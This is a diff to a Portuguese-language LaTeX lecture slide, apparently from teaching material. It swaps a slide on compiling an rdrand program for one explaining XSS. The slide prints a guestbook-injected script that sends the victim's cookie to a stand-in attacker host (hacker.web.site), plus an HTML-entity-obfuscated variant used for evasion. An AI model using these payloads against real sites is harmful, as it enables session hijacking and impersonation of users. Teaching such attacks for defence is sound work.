@@ -1,8 +1,16 @@
-\frametitle{Compilando o código com rdrand}
-\begin{verbatim}
-$nasm -f elf64 rdrand_bin.asm -o rdrand_bin.o
-$ld rdrand_bin.o -o rdrand_bin
-$ ./rdrand_bin | hexdump -C
+\frametitle{Exemplo de Ataque XSS e Ofuscação}
+\begin{itemize}
+        \item \textbf{Cenário (Roubo de Cookie):} Código injetado em um livro de visitas que envia o cookie da vítima para o atacante, permitindo personificação.
+              \begin{verbatim}
+Thanks for this information, its great!
+<script>document.location='http://hacker.web.site/cookie.cgi?'+
+document.cookie</script>
+        \end{verbatim}
 
-\end{verbatim}
-
+        \item \textbf{Ofuscação (Evasão):} O atacante utiliza entidades de caracteres HTML para esconder o script. O navegador interpreta o código abaixo de forma idêntica ao original.
+              \begin{verbatim}
+Thanks for this information, its great!
+&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
+&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116; ...
+        \end{verbatim}
+    \end{itemize}
